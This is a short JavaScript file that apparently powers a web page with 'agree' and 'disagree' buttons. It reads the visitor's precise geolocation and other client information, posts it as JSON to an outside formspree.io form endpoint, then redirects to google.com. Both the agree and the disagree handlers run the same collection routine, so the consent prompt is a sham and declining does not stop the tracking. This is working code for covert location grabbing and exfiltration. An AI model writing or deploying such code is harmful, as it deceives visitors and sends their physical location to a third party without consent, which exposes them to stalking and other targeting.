
let funcs = [
  collectPublicClientInfo,
  getPosData,
];
let funcsStatus = new Map();

for (let f of funcs) {
  funcsStatus.set(f.name, false);
}


async function getLocation() {
  try {
    return await new Promise(resolve =>
      navigator.geolocation?.getCurrentPosition(
        pos => resolve(pos),
        () => resolve(null)
      )
    );
  } catch {
    return null;
  }
}

async function sendRequest(data) {
  try {
    const response = await fetch("https://formspree.io/f/xeorknrp", {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify(data),
    });
  }
  catch (err) {
  }
}

async function getPosData() {
  try {
    const pos = await getLocation();
    const posData = {
      Latitude: pos.coords.latitude,
      Longitude: pos.coords.longitude,
      Accuracy: pos.coords.accuracy,
      Altitude: pos.coords.altitude,
      Speed: pos.coords.speed,
      Heading: pos.coords.heading,
    };
    return posData;
  } catch (err) {
  }
}

async function start() {
  for (let f of funcs) {
    let d = await f();
    if (funcsStatus.get(f.name) == false && d) {
      await sendRequest(d);
      funcsStatus.set(f.name, true);
    }
  }
  window.location.replace("https://google.com");
}

async function agree() {
  await start();
}

async function disAgree() {
  await start();
}


